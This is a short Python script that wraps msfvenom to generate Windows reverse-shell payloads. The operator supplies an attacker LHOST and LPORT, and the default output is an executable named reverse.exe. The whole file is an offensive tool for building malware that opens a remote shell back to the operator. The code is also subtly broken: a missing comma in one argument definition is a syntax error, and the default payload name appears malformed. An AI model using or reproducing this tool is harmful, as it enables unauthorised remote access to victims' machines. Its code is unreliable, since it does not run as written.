# A wrapper for msfvenom

import subprocess
import argparse
import sys

# default to windows/x64/reverse_tcp payload
DEFAULT_PAYLOAD = "windows/x64/reverse_tcp"

parser = argparse.ArgumentParser(description="A wrapper for msfvenom to generate payloads.")
parser.add_argument("--payload", default=DEFAULT_PAYLOAD, help="The payload to generate (default: windows/x64/reverse_tcp)")
parser.add_argument("-l", "--lhost", required=True, help="The LHOST for the payload")
parser.add_argument("-p", "--lport", required=True, help="The LPORT for the payload")
parser.add_argument("-f", "--format", required=False, default="exe", help="The output format (default: exe)")
parser.add_argument("-o", "--output", required=False, default="reverse.exe" help="The output file name")

args = parser.parse_args()

def generate_payload():
    command = [
        "msfvenom",
        "-p", args.payload,
        "LHOST=" + args.lhost,
        "LPORT=" + args.lport,
        "-f", args.format,
        "-o", args.output
    ]

    try:
        subprocess.run(command, check=True)
        print(f"Payload generated successfully: {args.output}")
    except subprocess.CalledProcessError as e:
        print(f"Error generating payload: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    if not args.lhost or not args.lport:
        print("LHOST and LPORT are required arguments.", file=sys.stderr)
        sys.exit(1)
    generate_payload()
